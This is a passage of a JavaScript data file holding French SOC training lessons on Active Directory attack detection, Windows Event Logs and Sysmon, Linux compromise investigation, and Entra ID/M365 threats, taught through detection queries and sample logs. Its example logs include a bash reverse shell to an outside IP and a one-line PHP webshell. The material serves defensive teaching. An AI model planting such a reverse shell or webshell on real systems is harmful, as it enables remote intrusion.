              { titre: "Analyser 20 Event 4769", desc: "Jeu de logs fourni : 20 Event 4769. Identifier lesquels sont suspects (RC4, volume, heure, source).", difficulte: "moyen", type: "analyse" }
            ],
            questions: [
              "Quelle est la différence entre Kerberoasting et AS-REP Roasting ?",
              "Event 4624 LogonType=3 avec NTLM depuis un poste utilisateur vers un DC — pourquoi est-ce suspect ?",
              "Comment BloodHound aide-t-il un SOC analyst (pas seulement un attaquant) ?"
            ],
            niveau_recruteur: `Comprendre les attaques AD est attendu dès le SOC L1 car 80% des incidents en entreprise impliquent une compromission AD. Savoir lire les Event 4769/4624/4662 et expliquer Kerberoasting en entretien = différenciateur fort.`,
            erreurs: [
              "Bloquer RC4 immédiatement sans impact analysis — des services legacy en ont besoin.",
              "Ignorer les Event 4662 car 'trop de volume' — c'est l'Event le plus critique pour DCSync.",
              "Penser que Pass-the-Hash est rare — c'est l'une des techniques post-compromission les plus utilisées."
            ],
            resume: `Kerberoasting = Event 4769 + EncType 0x17. Pass-the-Hash = Event 4624 + LogonType 3 + NTLM. DCSync = Event 4662 + propriétés de réplication + compte non-DC. BloodHound = cartographie des chemins d'attaque AD.`
          }
        },
        {
          id: "m2c2",
          titre: "Windows Event Logs — Investigation pratique",
          description: "Maîtriser les Event Logs Windows pour investiguer n'importe quel incident.",
          duree: "1 semaine",
          difficulte: "intermédiaire",
          prerequis: ["m1c3", "m1c4"],
          sous_competences: [
            "Architecture des Event Logs (channels, providers)",
            "Event IDs critiques SOC par catégorie",
            "Sysmon — installation, configuration, events clés",
            "PowerShell pour l'analyse des Event Logs",
            "Corrélation d'événements pour reconstruire une timeline",
            "Sigma rules — lire et comprendre"
          ],
          cours: {
            simple: `Les Windows Event Logs sont la principale source de preuves lors d'un incident Windows. Ils enregistrent tout : connexions, processus, services, modifications du registre. Sysmon les enrichit encore plus. Maîtriser leur lecture = maîtriser l'investigation Windows.

---

## Les Event IDs à connaître par cœur

### Authentification & Accès

| Event ID | Ce que ça signifie | Ce que tu cherches |
|----------|-------------------|-------------------|
| **4624** | Connexion réussie | LogonType 3/10 depuis IP externe suspecte |
| **4625** | Échec de connexion | Spike = brute force |
| **4634** | Déconnexion | Timeline de session |
| **4648** | Connexion avec credentials explicites | RunAs, Pass-the-Hash |
| **4672** | Privilèges spéciaux assignés | Admin ou SYSTEM inattendu |
| **4768** | Ticket Kerberos (TGT) demandé | Authentification AD |
| **4769** | Ticket de service (TGS) demandé | RC4 = Kerberoasting |

### Types de connexion (LogonType) — Crucial

| LogonType | Type | Suspect si... |
|-----------|------|---------------|
| 2 | Interactif (clavier) | Normal |
| 3 | Réseau (partage, WMI) | IP source inattendue |
| 4 | Batch (tâche planifiée) | Tâche créée récemment |
| 5 | Service | Service non reconnu |
| 10 | Remote Interactive (RDP) | Heure ou IP inhabituelle |

---

### Processus & Exécution

| Event ID | Ce que ça signifie | Ce que tu cherches |
|----------|-------------------|-------------------|
| **4688** | Nouveau processus créé | Parent = Office/navigateur → child = cmd/PS = compromission |
| **4689** | Processus terminé | Timeline |
| **4698** | Tâche planifiée créée | Persistance |
| **4702** | Tâche planifiée modifiée | Persistance modifiée |

**Sysmon Event 1** (Process Creation) est plus riche que 4688 : il inclut le hash MD5 du binaire + la ligne de commande complète.

---

### Objets & Registre

| Event ID | Ce que ça signifie | Ce que tu cherches |
|----------|-------------------|-------------------|
| **4663** | Accès à un fichier/dossier | Accès massif = ransomware |
| **4657** | Modification registre | Clé Run modifiée = persistance |
| **7045** | Nouveau service installé | Malware comme service |
| **4104** | Script PowerShell (bloc) | Contenu du script exécuté |

---

## Sysmon — L'enrichissement indispensable

**Ce que c'est :** un service Microsoft gratuit (Sysinternals) qui enrichit les logs Windows avec des informations que les Event Logs natifs n'ont pas.

**Les Events Sysmon les plus utiles :**

| Sysmon ID | Ce que ça log |
|-----------|--------------|
| **1** | Création de processus + hash + ligne de commande complète |
| **3** | Connexion réseau d'un processus (quel process vers quelle IP) |
| **7** | DLL chargée (détection de DLL injection) |
| **11** | Fichier créé (malware qui se dépose) |
| **12/13** | Clé registre créée/modifiée |
| **22** | Requête DNS d'un processus (quel process interroge quel domaine) |

**Exemple concret Sysmon Event 3 :**
\`\`\`
Process: C:\Windows\System32\Word.exe
DestinationIp: 185.220.101.42
DestinationPort: 4444
\`\`\`
→ Word qui établit une connexion réseau vers une IP externe = macro malveillante active.

---

## Requête SIEM type pour investigation

\`\`\`spl
# Splunk — Détecter un brute force sur un compte
index=windows EventCode=4625
| stats count by Account_Name, src_ip
| where count > 20
| sort - count

# Splunk — Détecter une tâche planifiée créée récemment
index=windows EventCode=4698
| table TimeCreated, SubjectUserName, TaskName, TaskContent
\`\`\`

---

## Workflow d'investigation Windows SOC L1

1. **Alerte reçue** → noter l'heure et l'endpoint concerné
2. **EDR** → arbre de processus, IoCs, timeline
3. **Event 4624/4625** → qui s'est connecté, depuis où, à quelle heure
4. **Event 4688 / Sysmon 1** → quels processus lancés dans la fenêtre de temps
5. **Sysmon 3** → connexions réseau de ces processus
6. **Event 4698** → tâche planifiée créée = persistance
7. **Conclusion** → Vrai Positif / Faux Positif + escalade si nécessaire`,
            technique: `## Sysmon — Events indispensables

| Event ID | Description | Utilité SOC |
|----------|-------------|-------------|
| 1 | Process Create | Chaîne de processus complète avec hash |
| 3 | Network Connection | Processus + IP distante + port |
| 7 | Image Loaded | DLL chargée (DLL hijacking) |
| 8 | CreateRemoteThread | Injection de code |
| 10 | ProcessAccess | Accès à lsass (Mimikatz) |
| 11 | FileCreate | Fichiers créés (droppers) |
| 12/13 | Registry | Modifications registre (persistance) |
| 22 | DNS Query | Requêtes DNS par processus |
| 23 | FileDelete | Suppression de preuves |

## Sysmon Event 10 — Accès à lsass (Mimikatz)
\`\`\`xml
<Event>
  <EventID>10</EventID>  <!-- ProcessAccess -->
  <SourceImage>C:\\Windows\\Temp\\mim.exe</SourceImage>
  <TargetImage>C:\\Windows\\System32\\lsass.exe</TargetImage>
  <GrantedAccess>0x1010</GrantedAccess>  <!-- PROCESS_VM_READ -->
  <CallTrace>C:\\Windows\\Temp\\mim.exe+0x1234</CallTrace>
</Event>
\`\`\`
Tout accès à lsass depuis un process non-système = Mimikatz probable.

## Sigma Rules — Lire une règle
\`\`\`yaml
title: Mimikatz via lsass Access
status: stable
logsource:
  product: windows
  category: process_access
detection:
  selection:
    TargetImage|endswith: '\\lsass.exe'
    GrantedAccess|contains:
      - '0x1010'
      - '0x1410'
  filter:
    SourceImage|startswith:
      - 'C:\\Windows\\System32\\'
  condition: selection and not filter
level: high
\`\`\``,
            attaquant: `Mimikatz accède à lsass.exe pour extraire les hashes et credentials en mémoire. Technique T1003.001 MITRE ATT&CK. Généré : Sysmon Event 10 + Event 4656 (handle to lsass).`,
            soc: `## Reconstruire une timeline avec Event Logs

\`\`\`powershell
# Timeline complète d'un incident — last 4 hours
$start = (Get-Date).AddHours(-4)
Get-WinEvent -FilterHashtable @{
  LogName = @('Security','System','Microsoft-Windows-Sysmon/Operational')
  StartTime = $start
} | Where-Object {
  $_.Id -in @(4624,4625,4688,4697,4698,4720,4732,7045,1,3,10,11,22)
} | Select-Object TimeCreated, Id, Message |
  Sort-Object TimeCreated |
  Export-Csv "C:\\Temp\\timeline.csv" -NoTypeInformation
\`\`\``,
            logs_exemples: `## Sysmon Event 1 — Macro malveillante
\`\`\`
EventID: 1 (Process Create)
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell.exe -nop -w hidden -enc SQBFAFgA...
ParentImage: C:\\Program Files\\Microsoft Office\\WINWORD.EXE
ParentCommandLine: "WINWORD.EXE" "C:\\Users\\user\\Downloads\\facture.doc"
Hashes: SHA256=abc123...
\`\`\`
**Interprétation :** Macro Word → PowerShell encodé caché. Alerte critique.`,
            atelier: {
              titre: "Atelier : Installer Sysmon et analyser ses premiers events",
              duree: "2h",
              niveau: "intermédiaire",
              objectif: "Configurer Sysmon sur une VM Windows et capturer des events d'attaque simulée",
              contexte: "Préparer l'endpoint pour une détection améliorée et observer les events générés.",
              outils: ["VM Windows 10", "Sysmon (Sysinternals)", "SwiftOnSecurity Sysmon config"],
              etapes: [
                "Télécharger Sysmon : https://docs.microsoft.com/sysinternals/downloads/sysmon",
                "Télécharger la config SwiftOnSecurity : github.com/SwiftOnSecurity/sysmon-config",
                "Installer : sysmon64.exe -accepteula -i sysmonconfig.xml",
                "Vérifier dans Event Viewer : Applications and Services → Microsoft → Windows → Sysmon",
                "Ouvrir cmd.exe depuis PowerShell (simuler une chaîne suspecte)",
                "Observer l'Event 1 généré : parent, enfant, CommandLine, Hash",
                "Faire une connexion réseau depuis PowerShell : Test-NetConnection google.com",
                "Observer l'Event 3 : processus + IP + port"
              ],
              livrable: "Capture des 5 premiers events Sysmon intéressants avec leur interprétation."
            },
            cas_concret: `## Reconstruire l'attaque complète via Sysmon

Timeline reconstituée depuis Sysmon events :
\`\`\`
09:15:03 - Event 11 : WINWORD.EXE crée C:\\Temp\\stage1.ps1
09:15:04 - Event 1  : WINWORD.EXE → cmd.exe → powershell.exe -enc [b64]
09:15:05 - Event 22 : powershell.exe interroge evil.com DNS
09:15:06 - Event 3  : powershell.exe → 185.x.x.x:443 connexion
09:15:08 - Event 11 : powershell.exe crée C:\\Users\\user\\AppData\\svcupd.exe
09:15:09 - Event 1  : svcupd.exe lancé (nouveau processus)
09:15:10 - Event 12 : svcupd.exe → HKCU\\Run "Update" créé
09:15:11 - Event 3  : svcupd.exe → 185.x.x.x:8080 (beacon)
\`\`\`
Sysmon donne la séquence complète en quelques secondes d'analyse.`,
            exercices: [
              { titre: "Analyser un jeu de logs Sysmon", desc: "CyberDefenders : challenge 'Tomcat Takeover' ou équivalent. Reconstruire l'attaque depuis les Sysmon events.", difficulte: "avancé", type: "lab", outil: "CyberDefenders, Event Viewer" }
            ],
            questions: [
              "Pourquoi Sysmon est-il supérieur aux Event Logs natifs Windows pour la détection ?",
              "Sysmon Event 10 sur lsass avec GrantedAccess 0x1010 — que suspectez-vous ?",
              "Comment reconstruire une timeline d'incident depuis des Event Logs multiples ?"
            ],
            niveau_recruteur: `Sysmon est utilisé dans la majorité des SOC modernes. Savoir l'installer, le configurer et lire ses events est attendu en L1. Les Sigma rules sont une compétence L1/L2 valorisée.`,
            erreurs: [
              "Ignorer le hash SHA256 dans Sysmon Event 1 — c'est l'IOC le plus direct à vérifier sur VirusTotal.",
              "Se focaliser sur un seul event — toujours reconstruire la timeline complète.",
              "Installer Sysmon sans config — la config par défaut est insuffisante pour la détection."
            ],
            resume: `Sysmon Event 1 = process + parent + hash. Event 10 = accès lsass = Mimikatz. Event 3 = connexion réseau par process. Sigma = règles de détection portables. Timeline = corréler les events pour reconstruire l'attaque.`
          }
        },
        {
          id: "m2c3",
          titre: "Administration Linux — vision défenseur",
          description: "Logs Linux, permissions, services — savoir investiguer un serveur Linux compromis.",
          duree: "1 semaine",
          difficulte: "intermédiaire",
          prerequis: ["m1c4"],
          sous_competences: [
            "Arborescence Linux critique (/etc, /var, /tmp, /proc)",
            "Permissions Unix et SUID/SGID",
            "Systemd et services malveillants",
            "Audit avec auditd",
            "Logs : auth.log, syslog, cron, messages",
            "Investigation post-compromise Linux"
          ],
          cours: {
            simple: `Les serveurs Linux (web, BDD, cloud) sont des cibles de choix. Un SOC analyst doit pouvoir s'y retrouver rapidement pour investiguer : lire les logs, identifier les processus suspects, trouver la persistance. Pas besoin d'être admin Linux — il faut savoir où chercher.

---

## Les logs Linux à connaître

| Fichier | Contenu | Ce que tu cherches |
|---------|---------|-------------------|
| \`/var/log/auth.log\` (Debian/Ubuntu) | Connexions SSH, sudo, PAM | Brute force, escalade de privs |
| \`/var/log/secure\` (RHEL/CentOS) | Même chose | Même chose |
| \`/var/log/syslog\` | Activité système générale | Cron suspect, services |
| \`/var/log/apache2/access.log\` | Requêtes HTTP | Web shell, scan, exploitation |
| \`/var/log/apache2/error.log\` | Erreurs serveur web | LFI, RFI, erreurs 500 en masse |
| \`/var/log/messages\` | Kernel, réseau | Erreurs système |
| \`/var/log/cron\` | Exécutions cron | Persistance via cron |

---

## SSH — Le vecteur principal

**Ce que tu vois dans /var/log/auth.log :**

\`\`\`bash
# Brute force SSH — des centaines de Failed password
Jan 15 03:22:41 srv01 sshd[12345]: Failed password for root from 185.220.101.42 port 51234 ssh2
Jan 15 03:22:42 srv01 sshd[12346]: Failed password for root from 185.220.101.42 port 51235 ssh2

# Connexion réussie après brute force — l'alerte critique
Jan 15 03:25:01 srv01 sshd[12389]: Accepted password for root from 185.220.101.42 port 51289 ssh2

# Backdoor SSH (clé autorisée inconnue ajoutée)
Jan 15 03:26:14 srv01 sshd[12401]: Accepted publickey for root from 45.33.32.156 port 58123 ssh2
\`\`\`

**Ton réflexe :**
1. Compter les Failed password par IP : \`grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn\`
2. Vérifier \`~/.ssh/authorized_keys\` — des clés inconnues ajoutées = backdoor
3. Checker \`last\` et \`lastb\` pour les connexions récentes

---

## Persistance Linux — Ce que cherche l'attaquant

**Cron jobs :**
\`\`\`bash
# Lister tous les crons (root et utilisateurs)
crontab -l -u root
ls /etc/cron.d/
cat /etc/crontab
\`\`\`

Un cron qui appelle un script dans \`/tmp/\` ou \`/dev/shm/\` = persistance malware. Exemple :
\`\`\`
*/5 * * * * root /tmp/.hidden/beacon.sh
\`\`\`

**Services systemd :**
\`\`\`bash
# Nouveau service créé récemment
ls -la /etc/systemd/system/ --sort=time | head -10
systemctl status nom-suspect.service
\`\`\`

**Fichiers de démarrage utilisateur :**
- \`~/.bashrc\`, \`~/.bash_profile\`, \`~/.profile\` → code exécuté à chaque connexion
- Chercher des \`curl\` ou \`wget\` dans ces fichiers = loader malware

---

## Web shells — Compromission des serveurs web

**Ce que c'est :** un fichier PHP/ASP malveillant déposé sur le serveur web qui permet à l'attaquant d'exécuter des commandes à distance via HTTP.

**Ce que tu vois dans les logs Apache :**
\`\`\`
GET /wp-content/uploads/shell.php?cmd=id HTTP/1.1 200
POST /images/image.php HTTP/1.1 200 - agent "curl/7.68.0"
\`\`\`

**Signaux d'alarme :**
- Un fichier \`.php\` dans un dossier \`/uploads/\` ou \`/images/\` → web shell probable
- Requêtes POST vers des images (.jpg, .png) → fichier mal nommé
- Code de réponse 200 pour des paths inhabituels

**Ton réflexe :** \`find /var/www -name "*.php" -newer /var/www/html/index.php -mtime -7\` → fichiers PHP récents.

---

## Commandes d'investigation Linux — Cheat sheet

\`\`\`bash
# Processus actifs avec hiérarchie
ps auxf | grep -v '\[' | head -50

# Connexions réseau actives
ss -tupn | grep ESTAB

# Fichiers ouverts par un processus suspect (PID 1234)
lsof -p 1234

# Fichiers récemment modifiés
find / -mtime -1 -type f -not -path "/proc/*" 2>/dev/null

# Comptes avec shell (potentiels backdoors)
grep -v "nologin\|false" /etc/passwd

# Historique commandes root
cat /root/.bash_history
\`\`\`

**Règle SOC :** sur Linux, cherche en premier dans \`/tmp/\`, \`/dev/shm/\`, et \`/var/www/\`. 80% des malwares Linux se cachent là.`,
            technique: `## Répertoires critiques

\`\`\`
/etc/passwd     → liste des utilisateurs (uid=0 = root)
/etc/shadow     → hashes des mots de passe (root seulement)
/etc/crontab    → tâches planifiées système
/var/log/       → tous les logs
/tmp/ /var/tmp/ → zones d'écriture universelle (malware souvent ici)
/dev/shm/       → mémoire partagée (malware in-memory)
/proc/[PID]/    → tout sur un processus en cours
/home/[user]/   → fichiers utilisateur, .bashrc, .ssh/
\`\`\`

## Auditd — Surveiller les actions sensibles
\`\`\`bash
# Installer et configurer auditd
apt install auditd

# Règles de surveillance
auditctl -w /etc/passwd -p wa -k passwd_changes
auditctl -w /etc/sudoers -p wa -k sudoers_changes
auditctl -a always,exit -F arch=b64 -S execve -k exec_commands
auditctl -w /tmp -p x -k tmp_execution

# Lire les logs auditd
ausearch -k passwd_changes
aureport -x --summary
\`\`\``,
            attaquant: `Persistance Linux classique : cron job avec reverse shell, service systemd malveillant, modification de .bashrc, ajout d'un compte dans /etc/passwd avec uid=0, SUID sur un binaire custom.`,
            soc: `## Checklist investigation Linux compromise
\`\`\`bash
# 1. Connexions réseau actives
ss -tulpn && lsof -i -n -P | grep ESTABLISHED

# 2. Processus suspects (dans /tmp, /dev/shm)
ps aux | grep -E "/tmp|/dev/shm|\./"

# 3. Fichiers récents dans zones suspectes
find /tmp /var/tmp /dev/shm -newer /etc/passwd -type f 2>/dev/null

# 4. Nouveaux comptes ou uid=0
grep -v "nologin\|false" /etc/passwd
awk -F: '$3==0 {print}' /etc/passwd  # tous les comptes root

# 5. Cron jobs
crontab -l; for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u $u 2>/dev/null && echo "==$u=="; done

# 6. Services systemd ajoutés
systemctl list-units --type=service --state=running | grep -v "standard"
ls /etc/systemd/system/*.service

# 7. Connexions SSH récentes
last -a | head -30
grep "Accepted" /var/log/auth.log | tail -20
\`\`\``,
            logs_exemples: `## Compromission Linux — Timeline logs
\`\`\`
03:22:14 auth.log : Failed password for root from 45.33.32.156 (x200)
03:25:01 auth.log : Accepted password for deploy from 45.33.32.156
03:25:15 auth.log : sudo: deploy: COMMAND=/bin/bash
03:25:22 syslog   : cron[1234]: (root) CMD (bash -i >& /dev/tcp/45.33.32.156/4444 0>&1)
03:25:23 syslog   : useradd: new user: name=support, uid=0, gid=0
\`\`\`
**Interprétation :** Brute force SSH réussi → sudo bash → backdoor cron → nouveau compte root.`,
            atelier: {
              titre: "Atelier : Investigation Linux — serveur web compromis",
              duree: "1h30",
              niveau: "intermédiaire",
              objectif: "Identifier la compromission d'un serveur web Linux via les logs",
              contexte: "Alerte : trafic sortant anormal depuis srv-web-02 vers 45.x.x.x:4444. Investiguer.",
              outils: ["SSH access", "bash", "grep/awk"],
              etapes: [
                "ss -tulpn → connexion sortante vers 45.x.x.x:4444 depuis quel process ?",
                "ps aux | grep [PID] → identifier le processus",
                "ls -la /proc/[PID]/exe → binaire réel",
                "find /tmp /var/tmp -newer /etc/passwd -type f",
                "cat /var/log/auth.log | grep Accepted → qui s'est connecté en SSH ?",
                "crontab -l pour tous les users → y a-t-il un reverse shell ?",
                "grep 'useradd\\|usermod' /var/log/auth.log → nouveaux comptes ?"
              ],
              livrable: "Rapport : vecteur d'accès initial, méthode de persistance, IOC, actions de remédiation."
            },
            cas_concret: `## Webshell sur un serveur Apache

Alerte proxy : requêtes POST vers /var/www/html/wp-content/uploads/shell.php

Analyse :
- find /var/www -name "*.php" -newer /var/www/html/wp-login.php → shell.php créé hier
- cat shell.php → \`<?php system($_GET['cmd']); ?>\` → webshell classique
- Apache access.log : 185.x.x.x GET /shell.php?cmd=id, cmd=whoami, cmd=cat /etc/passwd
- Actions : supprimer le webshell, analyser les commandes exécutées, patcher la vulnérabilité d'upload`,
            exercices: [
              { titre: "Investiguer un Linux compromis (CyberDefenders)", desc: "Challenge 'Linux Forensics' sur CyberDefenders. Identifier le vecteur d'attaque, la persistance, les données exfiltrées.", difficulte: "avancé", type: "lab", outil: "CyberDefenders" }
            ],
            questions: [
              "Un compte dans /etc/passwd avec uid=0 et login=support. Que faites-vous ?",
              "Comment un attaquant peut-il persister sur Linux sans modifier de fichier sur le disque ?",
              "Quelle est la différence entre /tmp et /dev/shm du point de vue attaquant ?"
            ],
            niveau_recruteur: `Administration Linux basique (lecture de logs, commandes d'investigation) attendue en L1. La majorité des serveurs en entreprise sont Linux.`,
            erreurs: [
              "Checker uniquement /var/log/auth.log et ignorer les access logs web — le vecteur initial est souvent applicatif.",
              "Supprimer le webshell immédiatement sans collecter de preuves (hash, copie, logs).",
              "Ignorer /dev/shm — les malwares in-memory y résident souvent."
            ],
            resume: `Investigation Linux : ss/lsof (réseau), ps/proc (processus), find /tmp (fichiers), auth.log (SSH), crontab (persistance), /etc/passwd uid=0 (backdoor). Toujours collecter les preuves avant de remédier.`
          }
        },
        {
          id: "m2c4",
          titre: "Azure AD / Entra ID & M365 Security",
          description: "L'identité cloud — incontournable en SOC 2024. Détecter les compromissions de comptes cloud.",
          duree: "1 semaine",
          difficulte: "intermédiaire",
          prerequis: ["m2c1"],
          sous_competences: [
            "Azure AD vs Active Directory on-prem",
            "Microsoft 365 : Exchange Online, SharePoint, Teams",
            "Conditional Access et MFA",
            "Azure AD Sign-in Logs et Audit Logs",
            "Attaques : Password Spray, MFA Bypass, Consent Phishing",
            "Microsoft Sentinel — premiers pas",
            "Unified Audit Log (UAL) M365"
          ],
          cours: {
            simple: `En 2024, la majorité des entreprises françaises utilisent Microsoft 365. L'identité est dans Azure AD (rebaptisé **Microsoft Entra ID**). Les incidents les plus fréquents : compromission de compte M365, MFA fatigue, phishing O365, Business Email Compromise. Le SOC L1 qui ne connaît pas l'environnement cloud est borgne.

---

## Azure AD / Entra ID — C'est quoi ?

**Ce que c'est :** l'équivalent cloud de l'Active Directory on-premise. Il gère les identités pour tous les services Microsoft 365 (Outlook, Teams, SharePoint, OneDrive).

**La différence avec l'AD classique :**
- AD on-premise : dans ton datacenter, protocole Kerberos
- Azure AD : dans le cloud Microsoft, protocole OAuth2 / OpenID Connect
- **Hybrid** : les deux en même temps (Azure AD Connect synchronise les comptes) — configuration la plus courante en France

**Ce que tu surveilles en SOC :**
- **Sign-in logs** : qui se connecte, depuis où, avec quel device, MFA passé ou non
- **Audit logs** : modifications de comptes, ajout d'admin, consent OAuth
- **Risky sign-ins** : Microsoft détecte lui-même les connexions suspectes

---

## Les alertes cloud les plus fréquentes en SOC

### Connexion depuis un pays inhabituel

**Ce que tu vois dans les Sign-in logs :**
\`\`\`
User: alice.martin@entreprise.fr
Location: Russie, 02:34 UTC
App: Microsoft 365
Status: Success (MFA bypassed - legacy auth)
\`\`\`

**Ton réflexe :** vérifier si l'authentification legacy (IMAP, POP3, SMTP basic auth) est activée — elle bypass le MFA. Si oui → désactiver immédiatement et alerter.

---

### MFA Fatigue (Prompt Bombing)

**Ce que fait l'attaquant :** après avoir volé le mot de passe, il envoie des dizaines de demandes MFA push jusqu'à ce que l'utilisateur accepte par fatigue ou erreur.

**Ce que tu vois :**
- Spike de push MFA refusés, puis un accepté
- Sign-in réussi depuis une IP inconnue, heure inhabituelle
- **Microsoft Sentinel** alerte : "MFA Fatigue Attack Detected"

**Ton réflexe :** contacter l'utilisateur directement, révoquer la session (invalidate refresh tokens), investiguer les actions post-connexion dans les audit logs.

---

### Consent Phishing (OAuth App Abuse)

**Ce que fait l'attaquant :** envoie un email avec un lien vers une application OAuth malveillante. L'utilisateur donne son consentement → l'app obtient accès à sa boîte mail sans avoir besoin de son mot de passe.

**Ce que tu vois :**
- **Audit Log** : "Consent to application" pour une app inconnue
- L'app demande des permissions larges : \`Mail.ReadWrite\`, \`Files.ReadWrite.All\`

**Ton réflexe :** Azure AD → Enterprise Applications → Applications avec accès récent. Révoquer le consent de l'app suspecte.

---

### Business Email Compromise (BEC) via Exchange Online

**Ce que fait l'attaquant :** après compromission d'un compte M365, il crée des règles de transfert automatique ou des règles qui cachent les réponses du vrai destinataire.

**Ce que tu vois dans les Audit Logs :**
\`\`\`
Operation: New-InboxRule
Parameters: ForwardTo = attacker@gmail.com, Name = "."
User: pdg@entreprise.fr
\`\`\`

**Ton réflexe :** Exchange Admin Center ou PowerShell → \`Get-InboxRule -Mailbox "pdg@entreprise.fr"\` → supprimer toutes les règles suspectes + changer le mot de passe.

---

## Microsoft Sentinel — Le SIEM cloud

**Ce que c'est :** le SIEM natif Azure qui ingère les logs Azure AD, M365, et d'autres sources. Il utilise **KQL** (Kusto Query Language) pour les requêtes.

**Requêtes KQL utiles :**

\`\`\`kql
// Connexions réussies depuis des pays inhabituels
SigninLogs
| where ResultType == 0
| where Location !in ("France", "Belgium", "Switzerland")
| project TimeGenerated, UserPrincipalName, Location, IPAddress, AppDisplayName
| order by TimeGenerated desc

// Détection MFA Fatigue - nombreux refus puis acceptation
SigninLogs
| where AuthenticationRequirement == "multiFactorAuthentication"
| summarize Refusals=countif(ResultType != 0), Success=countif(ResultType == 0) by UserPrincipalName, bin(TimeGenerated, 1h)
| where Refusals > 5 and Success > 0
\`\`\`

---

## Tableau de bord SOC Cloud — Priorités

| Alerte | Sévérité | Action immédiate |
|--------|----------|-----------------|
| Connexion réussie depuis pays à risque | Haute | Contacter user, révoquer session |
| MFA accepté après multiples refus | Critique | Bloquer compte, escalader |
| Consent OAuth app inconnue | Haute | Révoquer consent, analyser accès |
| Règle de transfert email créée | Critique | Supprimer règle, audit complet |
| Admin role ajouté à un compte | Critique | Vérifier légitimité, escalader |
| Legacy auth réussie | Haute | Désactiver legacy auth |

**Règle SOC cloud :** en cloud, l'identité est le périmètre. Un compte compromis = accès à toute la messagerie, tous les fichiers, potentiellement toute l'entreprise.`,
            technique: `## Azure AD Sign-in Logs — Structure
\`\`\`json
{
  "userPrincipalName": "john.doe@entreprise.fr",
  "ipAddress": "185.220.x.x",
  "location": { "city": "Moscow", "countryOrRegion": "RU" },
  "clientAppUsed": "SMTP Auth",
  "conditionalAccessStatus": "notApplied",
  "authenticationRequirement": "singleFactorAuthentication",
  "riskLevelDuringSignIn": "high",
  "status": { "errorCode": 0 }  // 0 = SUCCESS
}
\`\`\`

## Attaques courantes M365

**Password Spray :**
Tester 1 mot de passe commun (Autumn2023!) sur tous les comptes.
Évite le lockout car une seule tentative par compte.
Sign-in Logs : ErrorCode 50126 (x100+ comptes différents, même IP, même intervalle).

**MFA Fatigue / Push Bombing :**
Envoyer des dizaines de notifications MFA jusqu'à ce que l'utilisateur accepte par fatigue.
Event : multiples MFA requests depuis une IP inconnue, puis soudainement une acceptation.

**Consent Phishing :**
Application OAuth malveillante demande des permissions → l'utilisateur consent.
L'attaquant accède aux emails/fichiers sans connaître le mot de passe.
Event : Unified Audit Log → "Consent to application" avec permissions Mail.Read, Files.ReadWrite.

## Microsoft Sentinel — KQL basique
\`\`\`kql
// Connexions depuis des pays inhabituels
SigninLogs
| where TimeGenerated > ago(24h)
| where ResultType == 0  // succès
| where Location !in ("FR", "BE", "CH")
| project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName
| order by TimeGenerated desc
\`\`\``,
            attaquant: `Password Spray avec des outils comme MSOLSpray, TeamFiltration. Consent Phishing : créer une app Azure AD malveillante avec nom crédible (Microsoft Teams Update). Token theft : voler les tokens OAuth pour contourner le MFA (Evilginx, AiTM phishing).`,
            soc: `## Détection compromission compte M365

**Impossible Travel :**
\`\`\`kql
SigninLogs
| where ResultType == 0
| project UserPrincipalName, IPAddress, Location, TimeGenerated
| order by UserPrincipalName, TimeGenerated
// Si Paris à 09h00 et Tokyo à 09h30 → impossible travel
\`\`\`

**Password Spray :**
\`\`\`kql
SigninLogs
| where ResultType == 50126  // Wrong password
| where TimeGenerated > ago(1h)
| summarize count(), dc(UserPrincipalName) by IPAddress
| where dc_UserPrincipalName > 20  // 20+ comptes différents depuis une IP
\`\`\`

**Consent Phishing :**
\`\`\`kql
AuditLogs
| where OperationName == "Consent to application"
| project TimeGenerated, InitiatedBy, TargetResources
| where TargetResources has "Mail.Read" or "Files.ReadWrite"
\`\`\``,
            logs_exemples: `## Azure AD — Impossible Travel détecté
\`\`\`
09:02:15 | marie.dupont@corp.fr | IP: 90.x.x.x (Paris, FR) | SUCCESS | Chrome/Windows
09:47:33 | marie.dupont@corp.fr | IP: 185.x.x.x (Minsk, BY) | SUCCESS | Python-requests
\`\`\`
45 minutes entre Paris et Biélorussie = impossible travel. Compte compromis probable. Réinitialiser MFA et mot de passe immédiatement.`,
            atelier: {
              titre: "Atelier : Détecter un Password Spray sur M365",
              duree: "1h",
              niveau: "intermédiaire",
              objectif: "Identifier une attaque Password Spray dans les Azure AD Sign-in Logs",
              contexte: "Alerte Sentinel : 'Multiple failed sign-ins from single IP'. Investiguer.",
              outils: ["Microsoft Sentinel ou jeu de logs KQL fourni"],
              etapes: [
                "Requête KQL : SigninLogs | where ResultType == 50126 | summarize count() by IPAddress, bin(TimeGenerated, 5m)",
                "Identifier l'IP avec le plus grand volume d'échecs",
                "Vérifier le nombre de comptes uniques ciblés",
                "Y a-t-il eu des succès après les échecs ? (Password Spray réussi)",
                "Identifier les comptes compromis",
                "Actions : bloquer l'IP, forcer reset MFA sur les comptes ciblés"
              ],
              livrable: "Rapport : IP attaquante, comptes ciblés, comptes compromis, actions prises."
            },
            cas_concret: `## BEC via AiTM Phishing (Adversary-in-the-Middle)

L'attaquant utilise Evilginx pour intercepter le token MFA. L'utilisateur se connecte sur un faux portail M365, l'attaquant relaie vers le vrai M365 et vole le token de session.

Détection : connexion depuis une IP inconnue, puis activité immédiate (lecture emails, règle de transfert créée).

Azure AD logs :
- Connexion réussie avec MFA depuis IP 185.x.x.x (jamais vue)
- 2 minutes après : création d'une règle de boîte mail "transférer tout vers attacker@gmail.com"
- Unified Audit Log : "Set-InboxRule" opération par john.doe depuis IP suspecte`,
            exercices: [
              { titre: "KQL pour détecter Impossible Travel", desc: "Écrire une requête KQL complète qui détecte des connexions depuis 2 pays différents pour le même utilisateur dans une fenêtre de 2 heures.", difficulte: "avancé", type: "lab", outil: "Microsoft Sentinel (trial gratuit)" }
            ],
            questions: [
              "Pourquoi le Password Spray est-il plus difficile à détecter qu'un brute force classique ?",
              "Qu'est-ce que le Consent Phishing et comment le détecter ?",
              "Un utilisateur a accepté une notification MFA depuis une IP inconnue. Quelles sont vos actions immédiates ?"
            ],
            niveau_recruteur: `Azure AD / M365 = compétence très recherchée en SOC France 2024. Microsoft Sentinel est le SIEM dominant dans les nouveaux SOC. KQL (Kusto Query Language) = équivalent SPL pour Sentinel.`,
            erreurs: [
